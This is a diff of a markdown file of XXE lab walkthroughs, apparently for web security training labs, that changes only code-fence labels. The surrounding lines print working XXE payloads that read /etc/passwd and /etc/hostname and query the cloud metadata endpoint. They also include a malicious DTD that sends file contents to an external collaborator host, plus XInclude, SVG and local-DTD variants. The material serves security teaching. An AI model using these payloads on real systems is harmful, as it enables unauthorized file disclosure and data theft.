@@ -11,7 +11,7 @@
 1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
 2. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:
 
-```
+```text
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 ```
 
@@ -36,7 +36,7 @@ The lab server is running a (simulated) EC2 metadata endpoint at the default URL
 1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
 2. Insert the following external entity definition in between the XML declaration and the ``stockCheck`` element:
 
-```
+```text
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
 ```
 
@@ -64,13 +64,13 @@ You can detect the blind XXE vulnerability by triggering out-of-band interaction
 3. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
 4. Insert the following external entity definition in between the XML declaration and the ``stockCheck`` element, but insert your Burp Collaborator subdomain where indicated:
 
-```
+```text
 <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net"> ]>
 ```
 
 5. Replace the ``productId`` number with a reference to the external entity:
 
-```
+```text
 &xxe;
 ```
 
@@ -95,7 +95,7 @@ An attacker needs to use an external entity to make the XML parser issue a DNS l
 3. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
 4. Insert the following external entity definition in between the XML declaration and the ``stockCheck`` element, but insert your Burp Collaborator subdomain where indicated:
 
-```
+```text
 <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net"> %xxe; ]>
 ```
 
@@ -119,7 +119,7 @@ An attacker needs to use a parameter entity to make the XML parser issue a DNS l
 2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
 3. Place the Burp Collaborator payload into a malicious DTD file:
 
-```
+```text
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/?x=%file;'>">
 %eval;
@@ -130,7 +130,7 @@ An attacker needs to use a parameter entity to make the XML parser issue a DNS l
 5. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
 6. Insert the following external entity definition in between the XML declaration and the ``stockCheck`` element:
 
-```
+```text
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
 ```
 
@@ -153,7 +153,7 @@ An attacker needs to exfiltrate the contents of the `/etc/hostname` file. A **ma
 
 1. Click "Go to exploit server" and save the following malicious DTD file on your server:
 
-```
+```text
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
 %eval;
@@ -166,7 +166,7 @@ When imported, this page will read the contents of ``/etc/passwd`` into the ``fi
 3. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
 4. Insert the following external entity definition in between the XML declaration and the ``stockCheck`` element:
 
-```
+```text
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
 ```
 
@@ -189,7 +189,7 @@ This lab has a "Check stock" feature that embeds the user input inside a server-
 1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
 2. Set the value of the ``productId`` parameter to:
 
-```
+```text
 <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```
 
@@ -209,7 +209,7 @@ An attacker needs to inject an `XInclude` statement to retrieve the contents of 
 
 1. Create a local SVG image with the following content:
 
-```xml
+```text
 <?xml version="1.0" standalone="yes"?>
     <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
     <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
@@ -237,7 +237,7 @@ An attacker needs to upload an image that displays the contents of the /etc/host
 1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
 2. Insert the following parameter entity definition in between the XML declaration and the `stockCheck` element:
 
-```html
+```text
 <!DOCTYPE message [
 <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
 <!ENTITY % ISOamso '
